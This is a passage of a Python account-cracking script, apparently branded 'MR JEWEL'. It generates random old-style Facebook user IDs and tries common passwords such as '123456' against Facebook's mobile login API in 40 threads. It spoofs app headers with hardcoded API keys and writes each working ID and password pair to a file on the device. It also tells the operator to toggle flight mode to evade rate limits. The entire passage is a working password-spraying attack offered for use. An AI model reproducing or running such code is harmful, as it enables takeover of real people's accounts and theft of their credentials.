    loop +=1
#-----------------[ OLD-MENU ]-----------------#
def ___OLDX___():
	clear();print(f"{xd} EXAMPLE {O}:{G} 5555 {O}|{G} 7777 {O}|{G} 9999 {O}|{G} 99999 ");linex();limit = int(input(f"{xd} SELECTION {O}:{W} "))
	rangex="10000"
	for i in range(limit):data=str(random.choice(range(1000000000,1999999999)));user.append(data)
	with tred(max_workers=40) as ___OLD___:
		clear();total=str(len(user))
		print(f"{xd} TOTAL LIMIT {O}:{W} {total} ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		for poco in user:
			uid=rangex+poco
			___OLD___.submit(___M1XX___,uid)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED ');print(f'{xd} TOTAL OK IDS {O}:{G} {oks}');linex();sys.exit()
#-----------------[ OLD METHOD ]-----------------#
def ___M1XX___(uid):
	global loop,oks
	cn = random.randint(60,99)
	sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
	try:
		for pw in ["123456","1234567","12345678","123456789","123123","143143"]:
			data = {'adid': str(uuid.uuid4()), 'email': uid, 'password': pw, 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'device_based_login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'family_device_id': str(uuid.uuid4()), 'advertiser_id': str(uuid.uuid4()), 'locale': 'en_US', 'client_country_code': 'US', 'device_id': str(uuid.uuid4()), 'method': 'auth.login', 'api_key': '882a8490361da98702bf97a021ddc14d', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
			headers = {'user-agent': '[FBAN/MessengerLiteForiOS;FBAV/253.1.0.43.116;FBBV/200174216;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBCR/;FBID/phone;FBLC/en_GB;FBOP/0]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'x-fb-sim-hni': str(random.randint(20000000, 30000000)), 'X-FB-Connection-Type': 'WIFI', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': str(random.randint(20000000, 30000000)), 'x-fb-device-group': '5120', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-connection-bandwidth': str(random.randint(11111, 99999)), 'x-fb-connection-quality': 'EXCELLENT', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'x-fb-friendly-name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'x-fb-http-engine': 'Liger', 'Content-Length': f'6{cn}'}#643#
			url = "https://graph.facebook.com/auth/login"
			po = requests.post(url,data=data,headers=headers).json()
			if "session_key" in po:
				print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+uid+" | "+pw+"\033[1;97m")
				open('/sdcard/XD/CO-OLD-OK.txt','a').write(uid+'|'+pw+'\n')
				oks+=1
				break
			elif 'www.facebook.com' in po['error']['message']:
				print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+uid+" | "+pw+"\033[1;97m")
				open('/sdcard/XD/CO-OLD-OK.txt','a').write(uid+'|'+pw+'\n')
				oks+=1
				break
			else:continue
		loop += 1
	except Exception as e:
		pass
#-----------------[ END ]-----------------#
try:
    ___POCOX___()
except requests.exceptions.ConnectionError:
        print(f"{xd} YOUR NETWORK IS UNREACHABLE ")
        sys.exit()
except Exception as e:
    print(e)